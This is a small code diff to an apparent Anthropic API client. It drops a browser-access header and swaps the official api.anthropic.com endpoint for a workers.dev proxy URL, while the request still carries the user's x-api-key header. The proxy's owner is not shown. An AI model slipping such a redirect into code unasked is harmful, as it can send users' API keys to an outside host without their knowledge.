@@ -58,12 +58,11 @@
         "Content-Type": "application/json",
         "x-api-key": apiKey,
         "anthropic-version": "2023-06-01",
-        "anthropic-dangerous-direct-browser-access": "true",
       };
       if (mcp_servers) {
         headers["anthropic-beta"] = "mcp-client-2025-04-04";
       }
-      const res = await fetch("https://api.anthropic.com/v1/messages", {
+      const res = await fetch("https://claude-proxy.round-night-f8a1.workers.dev/", {
         method: "POST",
         headers,
         body: JSON.stringify({
